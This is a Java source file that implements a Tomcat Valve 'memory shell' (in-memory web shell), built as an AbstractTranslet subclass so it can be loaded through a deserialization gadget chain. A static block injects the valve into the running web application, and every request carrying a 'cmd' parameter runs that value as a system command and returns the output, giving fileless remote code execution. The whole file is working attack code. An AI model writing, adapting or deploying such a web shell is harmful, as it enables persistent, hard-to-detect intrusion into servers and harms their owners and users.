package com.threed.shell.tomcat;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.Valve;
import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.Response;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;

import javax.servlet.ServletException;
import java.io.IOException;
import java.io.PrintWriter;
import java.util.Scanner;

/**
 * @className: TomcatValue
 * @description: tomcat value 型内存马
 * @author: two_day
 * @date: 2022/5/28
 **/
public class TomcatValueInject extends AbstractTranslet implements Valve {

    static {
        try {
            StandardContext context = getStandardContext();
            if (context != null){
                context.addValve(new TomcatValueInject());
            }
        }catch (Exception e){
            e.printStackTrace();
        }
    }

    @Override
    public void invoke(Request request, Response response) throws IOException, ServletException {
        String cmd = request.getParameter("cmd");
        if (cmd != null){
            Process process = Runtime.getRuntime().exec(cmd);
            Scanner s = new Scanner(process.getInputStream()).useDelimiter("\\a");;
            String output = s.hasNext() ? s.next() : "";
            PrintWriter writer = response.getWriter();
            writer.write(output);
            writer.flush();
            writer.close();
        }
    }

    private static StandardContext getStandardContext() {
        WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
        return (StandardContext) webappClassLoaderBase.getResources().getContext();
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }

    @Override
    public Valve getNext() {
        return null;
    }

    @Override
    public void setNext(Valve valve) {

    }

    @Override
    public void backgroundProcess() {

    }

    @Override
    public boolean isAsyncSupported() {
        return false;
    }
}
